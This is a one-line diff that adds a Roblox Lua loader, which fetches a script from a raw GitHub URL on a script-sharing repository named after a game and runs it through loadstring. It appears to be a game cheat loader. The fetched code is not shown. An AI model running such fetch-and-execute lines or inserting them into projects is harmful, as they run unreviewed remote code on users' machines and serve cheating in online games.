@@ -1,0 +1,1 @@
+loadstring(game:HttpGet(('https://raw.githubusercontent.com/rblxscriptsnet/scripts/main/%2B1%20Blocks%20Every%20Second'),true))()
